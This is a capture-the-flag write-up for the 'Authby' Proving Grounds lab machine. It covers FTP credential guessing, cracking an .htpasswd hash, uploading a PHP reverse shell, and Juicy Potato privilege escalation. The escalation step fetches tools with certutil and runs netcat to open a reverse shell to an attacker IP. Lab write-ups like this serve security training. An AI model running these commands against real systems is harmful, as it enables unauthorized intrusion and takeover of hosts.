# **Authby | Proving Grounds Practice**


***

## **Difficulty == Hard**


![image](https://i.pinimg.com/originals/e6/ef/60/e6ef60252e1a13ba001279c54f868ce0.gif)


***



Running an nmap scan we have:



```
# Nmap 7.94SVN scan initiated Sun Jul  7 15:06:55 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.223.46
Nmap scan report for 192.168.223.46
Host is up (0.15s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
--SNIP--
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2024-07-07T14:09:50+00:00
|_ssl-date: 2024-07-07T14:09:55+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Issuer: commonName=LIVDA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-04-10T18:40:02
| Not valid after:  2024-10-10T18:40:02
| MD5:   f90f:0605:514d:dfe9:715d:b588:528e:16de
|_SHA-1: db3a:b973:d0f5:6dcc:f1e2:f121:1a95:e956:8c8d:a632
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  7 15:09:57 2024 -- 1 IP address (1 host up) scanned in 181.67 seconds
```



Anonymous login is enabled on the default FTP server but we can't download files neither can we put files

![](https://i.imgur.com/MWxJ8xe.png)


On port 242/HTTP we have an encrypted websites, We can't bruteforce cos we don't have a username



![](https://i.imgur.com/3WWYmZ3.png)



There is another FTP port but anonymous login isn't enabled


![](https://i.imgur.com/lQ6tZ7A.png)


Navigated back to the default FTP server and under the accounts directory we can see some lists of accounts



![](https://i.imgur.com/1XhyeKi.png)



Decided to try out the account `admin` and password `admin` which worked



![](https://i.imgur.com/uPNWiCH.png)



Downloaded all the files which was possible xD


![](https://i.imgur.com/y0hsn3l.png)


Under the `.htpasswd` file we have an encrypted password and username, looks like what we need for the web app login endpoint



![](https://i.imgur.com/65LUkZ0.png)


I also confirmed if the FTP server is connected to the web application which is true cos trying to read `.htpasswd` which was available at the FTP server is probably readable on the web application if we did not have a `403` status code



![](https://i.imgur.com/ZNoNiWr.png)



Decided to crack the password we got with `JtR` and we got a valid set of credential



```
john .htpasswd --wordlist=/usr/share/wordlists/rockyou.txt
```



![](https://i.imgur.com/jSgILCH.png)



Logged in via the web application endpoint and it was successful as seen below


![](https://i.imgur.com/xSdYWpk.png)


I also make sure to confirm if we had this same text in the `index.php` file downloaded from the FTP server


![](https://i.imgur.com/m7I53a7.png)


## **FootHold**


Saved **Ivan Sinceck** PHP shell to a file and use the `put` command to upload to the FTP server then executed it from the URL making sure i have my listener turned on



```
nc -lvnp 4444
```




![](https://i.imgur.com/xPsxY7f.png)


## **Privilege Escalation**


I found out that we have the `SeImpersonatePrivilege` and we can use this to escalate to administrator, the below command retrieves and displays specific system information, including the host name, OS name, OS version, system type, and hotfixes installed, from the output of the `systeminfo` command.



```bash
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```




![](https://i.imgur.com/7RjHWnh.png)


We can see that this is a `x86` system so we need 32 bit binaries, Transferred Juicy Potato which can be gotten from [here](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2), the netcat 32 bit version can also be googled online.



```
certutil -urlcache -f http://192.168.45.213/Juicy.Potato.x86.exe Juicy.Potato.x86.exe

certutil -urlcache -f http://192.168.45.213/nc.exe nc.exe
```



Then we need the CLSID to actually make this work, You can get the CLSID from [https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/)




```
.\Juicy.Potato.x86.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\wamp\bin\apache\Apache2.2.21\nc.exe 192.168.45.213 1337 -e cmd.exe" -l 1337 -c "{3c6859ce-230b-48a4-be6c-932c0c202048}"
```




![](https://i.imgur.com/EguxHg4.png)


> Note that if the exploit doesn't work it is a matter of "**trial and error**, so keep trying maybe 2-4 times and it should work.


Bankaaaaiiiii ⚔️


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



